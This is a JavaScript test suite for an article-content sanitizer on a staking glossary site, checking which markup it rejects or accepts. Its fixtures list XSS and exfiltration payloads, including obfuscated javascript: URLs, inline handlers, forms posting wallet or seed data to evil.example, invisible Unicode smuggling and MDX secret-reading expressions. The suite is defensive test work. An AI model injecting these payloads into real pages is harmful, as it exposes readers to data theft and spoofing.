import assert from 'node:assert/strict';
import { validateArticleContent } from './sync-articles.js';

const TAB = String.fromCharCode(0x09);
const ZERO_WIDTH_SPACE = String.fromCharCode(0x200b);
const SOFT_HYPHEN = String.fromCharCode(0x00ad);
const WORD_JOINER = String.fromCharCode(0x2060);
const NEXT_LINE = String.fromCharCode(0x85);
const RLO = String.fromCharCode(0x202e); // right-to-left override (Trojan Source)
const LRI = String.fromCharCode(0x2066); // left-to-right isolate
const PDI = String.fromCharCode(0x2069); // pop directional isolate

function rejects(content, label) {
  assert.throws(() => validateArticleContent('fixture', content), /Unsafe article content/, label);
}

function accepts(content, label) {
  assert.doesNotThrow(() => validateArticleContent('fixture', content), label);
}

// <base> tags are blocked: a single <base> rewrites every relative URL on the page.
rejects('Intro.\n\n<base href="https://evil.example/">', 'plain <base>');
rejects('Intro.\n\n<  base   href="https://evil.example/">', 'spaced <base>');

// define:vars can be entity-encoded to evade the literal pattern scan --
// define&#58;vars decodes to define:vars which Astro evaluates at build time.
rejects('Use define&#58;vars to inject.', 'entity-encoded define:vars');
rejects('Use define:vars to inject.', 'plain define:vars');
rejects('Intro.\n\n<frame src="https://evil.example/frame.html">', 'plain <frame>');
rejects('Intro.\n\n<frameset cols="50%,50%"><frame src="a.html"></frameset>', 'plain <frameset>');

// <form> tags are blocked: a raw form can submit reader data (e.g. wallet
// addresses entered into a hidden input) to an attacker-controlled action URL,
// with no JS and no flagged scheme -- action="https://..." passes every
// scheme/handler check above.
rejects('Intro.\n\n<form action="https://evil.example/collect" method="GET"><input name="wallet"><button>Go</button></form>', 'plain <form>');
rejects('Intro.\n\n<  form   action="https://evil.example/collect">', 'spaced <form>');

// Standalone form controls are blocked too: #184 blocks <form>, but a lone
// <button formaction="https://..."> or <input type="hidden" name="wallet"> still
// renders and can exfiltrate data without a wrapping form or flagged scheme.
rejects('Intro.\n\n<button formaction="https://evil.example/collect">Send</button>', 'plain button formaction');
rejects('Intro.\n\n<  button   formaction="https://evil.example/collect">', 'spaced button');
rejects('Intro.\n\n<input type="hidden" name="wallet" value="5Grw...">', 'plain hidden input');
rejects('Intro.\n\n<  input   type="text" name="seed">', 'spaced input');
rejects('Intro.\n\n<textarea name="note">secret</textarea>', 'plain textarea');
rejects('Intro.\n\n<select name="wallet"><option>5Grw...</option></select>', 'plain select');
rejects('Intro.\n\n<option value="evil">Pick me</option>', 'standalone option');
rejects('Intro.\n\n<optgroup label="Wallets"><option>5Grw...</option></optgroup>', 'plain optgroup');
rejects('Intro.\n\n<  optgroup   label="Wallets">', 'spaced optgroup');
rejects('Intro.\n\n<optgroup label="Recovery">', 'standalone optgroup');
accepts('An option group in a select menu is described here only as prose.', 'benign optgroup prose');
rejects('Intro.\n\n<fieldset><legend>Seed phrase</legend></fieldset>', 'standalone fieldset');
rejects('Intro.\n\n<datalist id="wallets"><option value="5Grw..."></datalist>', 'standalone datalist');
rejects('Intro.\n\n<output name="result">done</output>', 'standalone output');
rejects('Intro.\n\n<label>Enter your 12-word seed phrase:</label>', 'plain <label>');
rejects('Intro.\n\n<  label  >Wallet address</label>', 'spaced <label>');
rejects('Intro.\n\n<label for="wallet">Recovery phrase</label>', 'label with for attribute');
accepts('A field label in documentation refers to form captions described as prose.', 'benign label prose');
rejects('Intro.\n\n<menu type="context"><menuitem label="Open wallet"></menu>', 'plain menu with menuitem');
rejects('Intro.\n\n<  menu   type="context">', 'spaced menu');
rejects('Intro.\n\n<menuitem label="Export seed phrase">', 'standalone menuitem');
accepts('A context menu and menuitem element are described here only as prose.', 'benign menu prose');

// The `ping` attribute on an allowed <a> is a no-JS tracking beacon: a click
// POSTs to the listed URL. It passes every scheme/handler/element check, so it
// is blocked as its own attribute, like slot= and the form controls above.
rejects('Read [docs](https://x.example/) <a href="/wiki/stake/" ping="https://evil.example/track">stake</a>.', 'plain ping attribute');
rejects('Intro.\n\n<  a   href="/wiki/stake/"   ping = "https://evil.example/track">x</a>', 'spaced ping attribute');
// Quote-abutted / slash-delimited forms: `<a href="x"ping=…>` and `<a href=/x/ping=…>` slipped
// the whitespace-delimited `\sping=` scan because there is no whitespace before `ping`.
// Same quote-abutted pattern the merged contenteditable / tabindex / draggable blocks use.
rejects('Intro.\n\n<a href="/wiki/stake/"ping="https://evil.example/track">x</a>', 'quote-abutted ping attribute');
rejects('Intro.\n\n<a href=/wiki/stake/ping="https://evil.example/track">x</a>', 'slash-abutted ping attribute');

// Prose mentioning "ping" without an attribute assignment — including the
// "shipping"/"mapping" substrings — must still pass.
accepts('Network latency such as a 20 ms ping is unrelated to markup.', 'benign ping prose');
accepts('Shipping and mapping are ordinary words and must not be flagged.', 'benign ping substrings');
// A benign href containing the literal substring `ping=` (e.g. a slug or query
// string) must not trip the quote-abutted scan after the URL text is emptied.
accepts('See <a href="/wiki/stake?ping=skip">stake docs</a> for details.', 'benign ping= inside quoted href');

// contenteditable/tabindex/draggable on allowed elements expose editing, focus-trap,
// and drag surfaces with no script or flagged scheme. Tests use only allowed tags.
rejects('Intro.\n\n<div contenteditable="true">edit me</div>', 'plain contenteditable attribute');
rejects('Intro.\n\n<  p   contenteditable = "plaintext-only">edit</p>', 'spaced contenteditable attribute');
rejects('Intro.\n\n<div tabindex="0">trap</div>', 'plain tabindex attribute');
rejects('Intro.\n\n<  span   tabindex = "-1">trap</span>', 'spaced tabindex attribute');
rejects('Intro.\n\n<span draggable="true">drag</span>', 'plain draggable attribute');
rejects('Intro.\n\n<  a   href="/wiki/foo/"   draggable = "false">link</a>', 'spaced draggable attribute');

// Non-space-delimited spellings must be caught too (same contract as on* handlers).
rejects('<div href="x"contenteditable="true">edit</div>', 'quote-abutted contenteditable attribute');
rejects('<p class=x/tabindex="0">trap</p>', 'slash-delimited tabindex attribute');
rejects('<img src="/wiki/fig.png" draggable="true">', 'quote-abutted draggable attribute');

// Bare (valueless) contenteditable is the editable "true" state per the HTML spec,
// which the `=`-anchored value scans above miss. Block the presence form and its
// slash-boundary variants (parse5 parses them as a real bare contenteditable
// attribute), matching the merged autofocus/hidden/inert/itemscope presence blocks.
rejects('Intro.\n\n<p contenteditable>edit me</p>', 'bare contenteditable presence form');
rejects('Intro.\n\n<  div   contenteditable >edit</div>', 'spaced bare contenteditable');
rejects('Intro.\n\n<p/contenteditable>edit</p>', 'tag-name slash-delimited bare contenteditable');
rejects('Intro.\n\n<p /contenteditable>edit</p>', 'whitespace slash-delimited bare contenteditable');
rejects('<div class="x"/contenteditable>edit</div>', 'quote slash-delimited bare contenteditable');

// Benign URLs inside quoted attribute values must not trip the non-space scan.
accepts('See <a href="/online=1">pricing</a> for details.', 'equals sign inside quoted href');
// A class value that merely ends in "/contenteditable" is not a bare attribute.
accepts('Intro.\n\n<p class=x/contenteditable>text</p>', 'class value ending in /contenteditable is not an attribute');

// Prose that discusses these attributes without an assignment must still pass.
accepts('Rich editors set contenteditable on a container element.', 'benign contenteditable prose');
accepts('Keyboard navigation can reference the tabindex attribute.', 'benign tabindex prose');
accepts('Drag-and-drop UIs mark elements with the draggable attribute.', 'benign draggable prose');

// download= on an allowed <a> is a drive-by file download primitive; popover= on
// allowed elements renders a native overlay with no script or flagged scheme.
rejects('Intro.\n\n<a href="/evil.bin" download>grab</a>', 'bare download attribute');
rejects('Intro.\n\n<a href="/evil.bin" download="wallet.zip">grab</a>', 'plain download attribute');
rejects('Intro.\n\n<  a   href="/wiki/foo/"   download = "payload.bin">link</a>', 'spaced download attribute');
rejects('Intro.\n\n<div popover>overlay menu</div>', 'bare popover attribute on div');
rejects('Intro.\n\n<div popover="auto">overlay menu</div>', 'plain popover attribute on div');
rejects('Intro.\n\n<  p   popover = "manual">hidden panel</p>', 'spaced popover attribute');
rejects('Intro.\n\n<a/download href="/evil.bin">grab</a>', 'slash-delimited bare download after tag name');
rejects('Intro.\n\n<a /download href="/evil.bin">grab</a>', 'slash-delimited bare download after whitespace');
rejects('Intro.\n\n<div/popover>overlay menu</div>', 'slash-delimited bare popover after tag name');
rejects('Intro.\n\n<div /popover>overlay menu</div>', 'slash-delimited bare popover after whitespace');

// Non-space-delimited spellings must be caught too (same contract as on* handlers).
rejects('<a href="x"download>grab</a>', 'quote-abutted bare download attribute');
rejects('<a href="x"download="evil.zip">grab</a>', 'quote-abutted download attribute');
rejects('<a class="x"/download href="/evil.bin">grab</a>', 'quote-plus-slash-delimited bare download attribute');
rejects('<div class="x"popover>overlay</div>', 'quote-abutted bare popover attribute');
rejects('<div class="x"/popover>overlay</div>', 'quote-plus-slash-delimited bare popover attribute');
rejects('<div class=x/popover="auto">overlay</div>', 'slash-delimited popover attribute');

// Prose that discusses these attributes without an assignment must still pass.
accepts('A download manager fetches files unrelated to the download attribute.', 'benign download prose');
accepts('Popover overlays are a native UI primitive described here only as prose.', 'benign popover prose');
accepts('<a class=x/download href="/wiki/foo/">not a download attribute</a>', 'benign slash inside unquoted class value before bare download word');
accepts('<div class=x/popover>not a popover attribute</div>', 'benign slash inside unquoted class value before bare popover word');

// accesskey= binds a keyboard shortcut to an element, so an injected accesskey on
// a hidden link lets a single keypress activate it (focus/navigation hijack) with
// no script or flagged scheme. Blocked like the other interaction attributes.
rejects('Intro.\n\n<a href="/evil/" accesskey="s">go</a>', 'plain accesskey attribute');
rejects('Intro.\n\n<  div   accesskey = "x">hijack</div>', 'spaced accesskey attribute');
rejects('<a href="x"accesskey="s">go</a>', 'quote-abutted accesskey attribute');
rejects('<p class=x/accesskey="z">trap</p>', 'slash-delimited accesskey attribute');
accepts('An accesskey hint can document a keyboard shortcut without setting one.', 'benign accesskey prose');

// <details>/<summary> expose interactive disclosure UI with no script or inline
// style — the same unwanted interactive surface as the already-blocked <dialog>.
rejects('Intro.\n\n<details open><summary>Seed phrase</summary>evil</details>', 'plain <details>');
rejects('Intro.\n\n<  details  ><summary>x</summary></details>', 'spaced <details>');
rejects('Intro.\n\n<summary>Click here</summary>', 'standalone <summary>');

// Prose that merely mentions these words without an opening tag must still pass.
accepts('Details about staking are described here only as prose.', 'benign details prose');
accepts('A summary section is ordinary writing without a summary element tag.', 'benign summary prose');

// <noscript> is parsed under scripting-state-dependent rules — a known mXSS /
// sanitizer-confusion surface — and a glossary never needs script-fallback markup.
rejects('Intro.\n\n<noscript><img src="//evil.example/x"></noscript>', 'plain <noscript>');
rejects('Intro.\n\n<  noscript  >fallback</noscript>', 'spaced <noscript>');
accepts('Progressive enhancement and noscript fallbacks are described here as prose.', 'benign noscript prose');

// <noframes>/<noembed> are the obsolete siblings of <noscript> — raw-text
// parsing-context elements whose visibility flips on frames/embed support, the
// same mXSS/sanitizer-confusion surface. Blocked like noscript.
rejects('Intro.\n\n<noframes><img src="//evil.example/x"></noframes>', 'plain <noframes>');
rejects('Intro.\n\n<  noembed  >fallback</noembed>', 'spaced <noembed>');
accepts('Noframes and noembed fallbacks are described here only as prose.', 'benign noframes/noembed prose');

// <marquee> still renders an animated scrolling banner in current browsers, so an
// injected one is a content-spoofing / phishing surface with no script. Blocked.
rejects('Intro.\n\n<marquee>Your wallet is compromised — visit evil.example</marquee>', 'plain <marquee>');
rejects('Intro.\n\n<  marquee   behavior="alternate">x</marquee>', 'spaced <marquee>');
accepts('Scrolling marquee banners are a legacy UI pattern described here as prose.', 'benign marquee prose');

// <font>/<basefont>/<center> are obsolete presentational elements that re-introduce
// the colour/size/alignment content spoof the inline style= block prevents, without
// the attribute. Blocked like the other obsolete rendered elements.
rejects('Intro.\n\n<font color="red" size="7">WALLET COMPROMISED</font>', 'plain <font>');
rejects('Intro.\n\n<  basefont   face="Comic Sans">x</basefont>', 'spaced <basefont>');
rejects('Intro.\n\n<center>Fake centered alert</center>', 'plain <center>');
accepts('Sans-serif fonts and centered layouts are described here only as prose.', 'benign font/center prose');

// <big>/<strike>/<tt>/<nobr> are obsolete presentational text elements that restyle
// text without the blocked style= attribute (the same spoof as <font>/<center>).
rejects('Intro.\n\n<big>HUGE FAKE WARNING</big>', 'plain <big>');
rejects('Intro.\n\n<  strike  >struck</strike>', 'spaced <strike>');
rejects('Intro.\n\n<tt>monospace</tt>', 'plain <tt>');
rejects('Intro.\n\n<nobr>unwrapped</nobr>', 'plain <nobr>');
accepts('Big monospace headings and strike-through prices are described here as prose.', 'benign obsolete-text prose');

// <plaintext>/<xmp>/<listing> are obsolete raw-text elements the parser still
// honors. An injected <plaintext> renders all following content as literal text —
// a concrete page-defacement vector — so block them.
rejects('Intro.\n\n<plaintext>everything after this becomes raw text', 'plain <plaintext>');
rejects('Intro.\n\n<  xmp  >raw</xmp>', 'spaced <xmp>');
rejects('Intro.\n\n<listing>raw</listing>', 'plain <listing>');
accepts('A plaintext export or an XMP metadata block is described here only as prose.', 'benign plaintext/xmp prose');

// <bdo dir="rtl"> forces a per-character direction override (the markup form of the
// bidi control chars above) — it can render a reversed scam URL/address as a
// legitimate-looking string. The `dir` attribute on ordinary elements does not
// reverse LTR runs, so <bdo> is a distinct primitive that must be blocked.
rejects('Intro.\n\n<bdo dir="rtl">moc.elpmaxe-live//:sptth</bdo>', 'plain <bdo>');
rejects('Intro.\n\n<  bdo   dir="rtl">x</bdo>', 'spaced <bdo>');
accepts('Bidirectional override and the bdo element are described here only as prose.', 'benign bdo prose');

// <meter>/<progress> render native gauge/progress-bar widgets — an injected one
// is a content-spoofing surface (a fake "scan 80%" bar or risk gauge) a glossary
// never needs, blocked like the other non-prose rendered elements.
rejects('Intro.\n\n<progress value="0.8" max="1">80%</progress>', 'plain <progress>');
rejects('Intro.\n\n<  meter   value="0.9" min="0" max="1">risk</meter>', 'spaced <meter>');
accepts('A progress bar or a risk meter is described here only as prose.', 'benign meter/progress prose');

// <canvas> renders a sized bitmap region; an injected oversized one defaces the
// article layout, and it is the scripting-companion drawing element prose never needs.
rejects('Intro.\n\n<canvas width="1200" height="2000"></canvas>', 'plain <canvas>');
rejects('Intro.\n\n<  canvas   id="x">fallback</canvas>', 'spaced <canvas>');
accepts('The HTML canvas element is described here only as prose.', 'benign canvas prose');

// <ruby>/<rt>/<rp>/<rtc>/<rb> render interlinear annotation text (small type above
// the base text); an injected <ruby>scam<rt>✓ official</rt></ruby> overlays a fake
// trust mark — a content-spoof in the same class as the blocked marquee/bdo/font.
rejects('Intro.\n\n<ruby>5Fake address<rt>✓ official</rt></ruby>', 'plain <ruby> with <rt>');
rejects('Intro.\n\n<  ruby   lang="ja">x</ruby>', 'spaced <ruby>');
rejects('Intro.\n\n<rt>annotation</rt>', 'standalone <rt>');
rejects('Intro.\n\n<rp>(</rp>', 'standalone <rp>');
rejects('Intro.\n\n<rtc>group</rtc>', 'standalone <rtc>');
rejects('Intro.\n\n<rb>base</rb>', 'standalone <rb>');
accepts('The HTML ruby element is described here only as prose.', 'benign ruby prose');
accepts('A ruby gemstone and the Ruby language are ordinary words.', 'benign ruby/Ruby words');

// referrerpolicy= overrides the site's strict Referrer-Policy header for one
// element — an injected referrerpolicy="unsafe-url" leaks the full referring URL
// to an external destination. Blocked like the other interaction attributes.
rejects('Intro.\n\n<a href="https://evil.example/" referrerpolicy="unsafe-url">go</a>', 'plain referrerpolicy attribute');
rejects('Intro.\n\n<  img   src="/wiki/fig.png"   referrerpolicy = "unsafe-url">', 'spaced referrerpolicy attribute');
rejects('<a href="x"referrerpolicy="unsafe-url">go</a>', 'quote-abutted referrerpolicy attribute');
rejects('<img src="/a.png"/referrerpolicy="unsafe-url">', 'slash-delimited referrerpolicy attribute');
accepts('A site-wide referrer policy is configured in the response headers, described here as prose.', 'benign referrer policy prose');

// dir= on allowed elements sets text direction — a Trojan Source / visual-spoof
// primitive (CVE-2021-42574) even though <bdo> and raw bidi controls are blocked.
rejects('Intro.\n\n<p dir="rtl">moc.elpmaxe-live//:sptth</p>', 'plain dir attribute');
rejects('Intro.\n\n<  span   dir = "rtl">x</span>', 'spaced dir attribute');
rejects('<p class=x/dir="rtl">x</p>', 'slash-delimited dir attribute');
rejects('<a href="x"dir="rtl">link</a>', 'quote-abutted dir attribute');
accepts('The dir attribute sets base text direction on an element.', 'benign dir prose');
accepts('A redirect sends the browser to another URL.', 'benign redirect substring');

// inert= on an allowed element is a clickjacking / focus-hijack primitive: it
// takes the element out of the tab order and pointer events, so an injected
// <a inert href="https://evil/"> or <form inert>…</form> renders as visible
// "disabled-looking" content that the reader can still middle-click (link)
// or focus via assistive tech. Same interaction-surface class as the merged
// contenteditable / tabindex / draggable / popover / accesskey blocks.
rejects('Intro.\n\n<a href="https://evil.example/" inert>click me</a>', 'plain inert attribute');
rejects('Intro.\n\n<  a   href = "/wiki/foo/"   inert  >link</a>', 'spaced inert attribute');
rejects('Intro.\n\n<form inert action="https://evil.example/collect">go</form>', 'plain inert on form');
rejects('<a href="x"inert>go</a>', 'quote-abutted inert attribute');
rejects('Intro.\n\n<button inert type="button">Send</button>', 'plain inert on button');
rejects('Intro.\n\n<div/inert>blocked</div>', 'slash-delimited bare inert after tag name');
rejects('Intro.\n\n<div /inert>blocked</div>', 'slash-delimited bare inert after whitespace');
rejects('<div class="x"/inert>blocked</div>', 'quote-plus-slash-delimited bare inert attribute');
// Prose that mentions "inert" without an attribute assignment still passes.
accepts('A deactivated control is functionally inert in the DOM.', 'benign inert prose');
accepts('The inert attribute removes an element from the tab order.', 'benign inert attribute prose');
accepts('<div class=x/inert>not an inert attribute</div>', 'benign slash inside unquoted class value before bare inert word');

// Plain dangerous URL schemes remain blocked.
rejects('See [x](javascript:alert(1)).', 'plain javascript:');
rejects('See [x](vbscript:msgbox(1)).', 'plain vbscript:');
rejects('See [x](data:text/html;base64,PHNjcmlwdD4=).', 'plain data:text/html');
rejects('See [x](data:image/svg+xml,<svg></svg>).', 'plain svg data uri');
rejects('See [x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+).', 'base64 svg data uri (script hidden in blob)');
rejects('See [x](data:application/xhtml+xml;base64,PHNjcmlwdD4=).', 'base64 xhtml data uri (script hidden in blob)');
rejects('See [x](data:text/javascript,alert(1)).', 'plain data:text/javascript');
rejects('See [x](data:application/ecmascript,alert(1)).', 'plain data:application/ecmascript');
rejects('See [x](&#100;ata:text/javascript,alert(1)).', 'entity data:text/javascript');

// MDX expression braces execute at build time in article bodies. They are only
// allowed when escaped as literal prose or inside Markdown code examples.
rejects('Do not evaluate {process.env.SECRET_TOKEN}.', 'plain MDX expression brace');
rejects('A stray closing brace } is rejected conservatively.', 'stray MDX closing brace');
rejects(String.raw`Even backslashes do not escape \\{process.env.SECRET_TOKEN}.`, 'double-backslash MDX brace evasion');

// MDX disables CommonMark indented code blocks (they collide with JSX
// indentation), so a 4-space / tab indented line is NOT inert code: its braces
// evaluate as a live MDX expression at build time. The scanner must reject
// indented braces, not mistake them for a code block and skip them.
rejects('Intro.\n\n    {process.env.SECRET_TOKEN}\n', 'four-space indented MDX expression');
rejects('Intro.\n\n\t{process.env.SECRET_TOKEN}\n', 'tab-indented MDX expression');
rejects('- item\n\n    {process.env.SECRET_TOKEN}\n', 'list-indented MDX expression');
rejects('> quote\n\n    {process.env.SECRET_TOKEN}\n', 'blockquote-indented MDX expression');

// Obfuscated dangerous schemes are now blocked too.
rejects('See [x](java&amp;#115;cript:alert(1)).', 'double-encoded amp javascript:');
rejects('See [x](java&#115;cript:alert(1)).', 'decimal-entity javascript:');
rejects('See [x](java&#x73;cript:alert(1)).', 'hex-entity javascript:');
rejects('See [x](javascript&colon;alert(1)).', 'named-colon javascript:');
rejects(`See [x](java${TAB}script:alert(1)).`, 'tab-split javascript:');
rejects(`See [x](java${ZERO_WIDTH_SPACE}script:alert(1)).`, 'zero-width javascript:');
rejects(`See [x](java${SOFT_HYPHEN}script:alert(1)).`, 'soft-hyphen javascript:');
rejects(`See [x](java${WORD_JOINER}script:alert(1)).`, 'word-joiner javascript:');
rejects(`See [x](java${NEXT_LINE}script:alert(1)).`, 'C1-control javascript:');
rejects('See [x](&#100;ata:text/html,evil).', 'entity data:text/html');
rejects('See [x](vb&#115;cript:msgbox(1)).', 'decimal-entity vbscript:');
rejects('See [x](&#100;ata:image/svg+xml;base64,PHN2Zz4=).', 'entity-obfuscated svg data uri');
rejects('See [x](&#100;ata:application/xhtml+xml;base64,PHNjcmlwdD4=).', 'entity-obfuscated xhtml data uri');
rejects('See [x](data:image/svg&plus;xml;base64,PHN2Zz4=).', 'named-plus-entity svg data uri');
rejects('See [x](data:application/xhtml&plus;xml;base64,PHNjcmlwdD4=).', 'named-plus-entity xhtml data uri');

// Bidirectional control characters (Trojan Source, CVE-2021-42574) reorder how
// text renders without changing its bytes, so a link can display as a trusted
// host while resolving elsewhere, or prose can be scrambled past a reviewer.
// They are invisible in most editors, so they must be rejected outright.
rejects(`A link [docs](https://docs.bittensor.com${RLO}/evil/) here.`, 'right-to-left override in URL');
rejects(`Intro.\n\nReorder ${LRI}some text${PDI} here.`, 'directional isolate controls');

// Plain prose with no bidi controls must still pass.
accepts('Staking and unstaking are described here in ordinary left-to-right prose.', 'benign prose without bidi controls');

// Invisible bidi marks (LRM/RLM/ALM) and zero-width characters (ZWSP/word joiner/
// BOM) are invisible in glossary prose and complete the Trojan-Source / invisible-
// character family the bidi control block above guards. The directional marks
// slip past the embedding/override/isolate-only bidiControlPattern, and the
// zero-width characters can split a flagged term or scam address so it renders
// normally but evades naive pattern detection. Reject all six outright.
const LEFT_TO_RIGHT_MARK = String.fromCharCode(0x200e);
const RIGHT_TO_LEFT_MARK = String.fromCharCode(0x200f);
const ARABIC_LETTER_MARK = String.fromCharCode(0x061c);
const BYTE_ORDER_MARK = String.fromCharCode(0xfeff); // zero width no-break space / BOM
rejects(`Send TAO to 5Grw${ZERO_WIDTH_SPACE}kHvr address.`, 'zero-width space splitting an address');
rejects(`Reorder ${LEFT_TO_RIGHT_MARK}some text${RIGHT_TO_LEFT_MARK} here.`, 'invisible LRM/RLM bidi marks');
rejects(`An arabic letter mark ${ARABIC_LETTER_MARK} hides here.`, 'arabic letter mark');
rejects(`A word${WORD_JOINER}joiner hides here.`, 'word joiner');
rejects(`A byte order mark ${BYTE_ORDER_MARK} hides here.`, 'BOM / zero width no-break space');
accepts('Zero-width and bidi-mark characters are described here only as prose.', 'benign invisible-char prose with none present');

// C0/C1 control characters and DEL are non-printable bytes with no place in
// rendered prose; the sanitizer strips this class for URL scheme scans, and this
// extends it to article content. TAB/LF/CR whitespace is excluded. Built with
// String.fromCharCode so this test file holds no literal control bytes.
rejects('A form' + String.fromCharCode(0x0c) + 'feed splits a term.', 'C0 form feed control character');
rejects('A null' + String.fromCharCode(0x00) + 'byte hides here.', 'C0 NUL control character');
rejects('A delete' + String.fromCharCode(0x7f) + 'char hides here.', 'DEL control character');
rejects('A C1' + String.fromCharCode(0x85) + 'control hides here.', 'C1 control character (NEL)');
accepts('Line one' + String.fromCharCode(0x0a) + 'line two with a' + String.fromCharCode(0x09) + 'tab pass fine.', 'benign TAB and LINE FEED whitespace passes');
accepts('Ordinary glossary prose with spaces and punctuation is fine.', 'benign prose with no control characters');

// Additional invisible format characters (soft hyphen, invisible math operators,
// Mongolian vowel separator, Hangul fillers) render nothing in Latin prose and
// can split a flagged term like the zero-width characters; none is authored by
// Markdown. Built with String.fromCharCode so no literal invisible bytes appear.
rejects('A soft' + String.fromCharCode(0x00ad) + 'hyphen splits a term.', 'soft hyphen U+00AD');
rejects('Invisible' + String.fromCharCode(0x2062) + 'times hides here.', 'invisible times U+2062');
rejects('A mongolian' + String.fromCharCode(0x180e) + 'separator hides.', 'mongolian vowel separator U+180E');
rejects('A hangul' + String.fromCharCode(0x3164) + 'filler hides here.', 'hangul filler U+3164');
// COMBINING GRAPHEME JOINER (U+034F) is an invisible format character that alters
// grapheme-cluster boundaries without a visible glyph — same token-splitting class
// as the zero-width characters; ZWJ (U+200D) is deliberately not blocked for emoji.
rejects('A wallet' + String.fromCharCode(0x034f) + 'address splits here.', 'combining grapheme joiner U+034F');
// U+206A-U+206F (inhibit/activate symmetric swapping, Arabic form shaping, national/
// nominal digit shapes) complete the invisible format-character range the U+2061-U+2064
// math operators above started; all render nothing in Latin prose.
rejects('Symmetric' + String.fromCharCode(0x206a) + 'swap hides here.', 'inhibit symmetric swapping U+206A');
rejects('Arabic' + String.fromCharCode(0x206d) + 'shaping hides here.', 'activate arabic form shaping U+206D');
rejects('A nominal' + String.fromCharCode(0x206f) + 'digit shape hides.', 'nominal digit shapes U+206F');
accepts('An ordinary ascii-hyphen word like proof-of-stake is fine.', 'benign ASCII hyphen-minus passes');

// Unicode tag characters (U+E0000-U+E007F) and interlinear annotation anchors
// (U+FFF9-U+FFFB) are invisible no-glyph format code points: the tag block is the
// "ASCII smuggling" hidden-text vector and the annotation anchors render nothing.
// Built with String.fromCodePoint so no literal invisible bytes appear in source.
rejects('A normal sentence.' + String.fromCodePoint(0xe0054) + 'A hidden tag char rides along.', 'tag character U+E0054 (ASCII smuggling)');
rejects('Start' + String.fromCodePoint(0xe0001) + 'language tag base hides here.', 'tag character U+E0001');
rejects('An' + String.fromCodePoint(0xfff9) + 'interlinear anchor hides here.', 'interlinear annotation anchor U+FFF9');
accepts('Ordinary prose with an emoji 😀 and math symbol 𝐀 passes fine.', 'benign emoji and astral math characters pass');
accepts('Tag characters and interlinear annotation are described here only as prose.', 'benign invisible-smuggling-char prose with none present');

// Line/paragraph separators (U+2028/U+2029) are invisible no-glyph format characters
// a browser treats as a break; an injected one splits a term invisibly. Built with
// String.fromCharCode so no literal separator byte appears in this source.
rejects('A split' + String.fromCharCode(0x2028) + 'address hides a break here.', 'line separator U+2028');
rejects('A paragraph' + String.fromCharCode(0x2029) + 'separator hides here.', 'paragraph separator U+2029');
accepts('Ordinary prose with normal sentences and spacing passes fine.', 'benign prose with no separator characters');
accepts('Paragraph one ends.' + String.fromCharCode(0x0a) + String.fromCharCode(0x0a) + 'Paragraph two via blank line passes.', 'benign Markdown blank-line paragraph break passes');

// Inline event handlers are blocked regardless of the attribute delimiter — a
// slash, or a quote abutting the handler — not just a leading space.
rejects('<img src=x onerror=alert(1)>', 'space-delimited handler');
rejects('<img src=x/onerror=alert(1)>', 'slash-delimited handler');
rejects('<a href="x"onclick=alert(1)>c</a>', 'quote-abutted handler');
rejects("<p title='a'onmouseover=alert(1)>h</p>", 'single-quote-abutted handler');

// Legitimate content passes — guard against false positives.
accepts(
  '# Staking\n\nStaking locks TAO. Source: [docs](https://docs.bittensor.com/).',
  'normal article'
);
accepts(
  'The word JavaScript appears here, and a base value of 10, without any scheme.',
  'benign keywords (no scheme)'
);
accepts(
  'VBScript is a legacy Microsoft scripting language, mentioned here only as prose.',
  'benign vbscript keyword (no scheme)'
);
accepts(
  'A raster data URI such as data:image/png;base64,iVBORw0KGgo= is harmless and allowed.',
  'benign raster data URI (only script-capable data URLs are blocked)'
);
accepts(
  'Encode an ampersand as &amp; or a snowman as &#9731; without tripping the scanner.',
  'benign entities'
);
accepts(
  'Prose may use the plus entity: C&plus;&plus; and the sum 2 &plus; 2 = 4 are fine.',
  'benign named-plus entity (no scheme)'
);
accepts(
  String.raw`Literal braces can be escaped as \{alpha\} in prose.`,
  'escaped literal MDX braces'
);
accepts(
  '---\ntitle: "Alpha {TAO}"\n---\n\nFrontmatter braces are metadata, not article-body MDX.',
  'frontmatter braces'
);
accepts(
  '```jsx\n{process.env.SECRET_TOKEN}\n```\n',
  'fenced code block with braces'
);
accepts(
  '~~~js\n{process.env.SECRET_TOKEN}\n~~~\n',
  'tilde fenced code block with braces'
);
accepts(
  'Use `{process.env.SECRET_TOKEN}` as an inline code example.',
  'inline code span with braces'
);
accepts(
  'Emoji before code stays aligned 🧠 `{process.env.SECRET_TOKEN}`.',
  'inline code span after astral Unicode'
);
accepts(
  'A query like [docs](https://example.com/online=1) is fine — a URL path segment is not a handler.',
  'url segment resembling a handler (not inside a tag)'
);
// Handler-like text inside a quoted attribute value is NOT an inline handler:
// the slash lives in a URL/path, not at an attribute boundary.
accepts('<a href="/online=1">link</a>', 'handler-like path in a quoted href value');
accepts('<img src="/onboarding=1.png" alt="x">', 'handler-like path in a quoted src value');
accepts('<code data-example="/onerror=not-handler">snippet</code>', 'handler-like text in a quoted data- value');

rejects('Hydrate with client:load here.', 'client directive token in article body');
rejects('Render via server:defer here.', 'server directive token in article body');
rejects('Render with is:raw here.', 'is directive token in article body');
rejects('Render with is:global here.', 'is:global directive token in article body');
rejects('Render with class:list here.', 'class:list directive token in article body');
rejects('Render with set:text here.', 'set:text directive token in article body');
rejects('Pass secrets with define:vars={{ token }}.', 'define:vars directive token in article body');
rejects('Render with class&#58;list here.', 'entity-encoded class:list directive');
rejects('Render with set&#58;text here.', 'entity-encoded set:text directive');

// Every template directive — not just define:vars — must also be caught after
// entity/zero-width deobfuscation, so an obfuscated spelling cannot slip the
// literal scan the way `set&colon;html` once did. The patterns are now
// allowlisted to the documented Astro 6.x directive values, so the
// obfuscation regression tests below cover listed values (vars, etc.) only —
// unlisted "directive-shaped" tokens in prose pass through, which is the
// intended behavior of the tightened regex.
rejects('Inject set&#58;html here.', 'entity-encoded set:html');
rejects('Inject set&colon;html here.', 'named-colon set:html');
rejects(`Inject set:ht${SOFT_HYPHEN}ml here.`, 'soft-hyphen set:html');
rejects(`Inject set:te${SOFT_HYPHEN}xt here.`, 'soft-hyphen set:text');
rejects(`Render with class:li${SOFT_HYPHEN}st here.`, 'soft-hyphen class:list');
rejects('Hydrate with client&#58;load here.', 'entity-encoded client: directive');
rejects('Render via server&colon;defer here.', 'named-colon server: directive');
rejects('Render with is&colon;raw here.', 'named-colon is: directive');
rejects('Render with is&colon;global here.', 'named-colon is:global');
rejects(`Inject define:va${SOFT_HYPHEN}rs here.`, 'soft-hyphen define:vars');

// Astro slot attributes on raw HTML must not appear in article bodies.
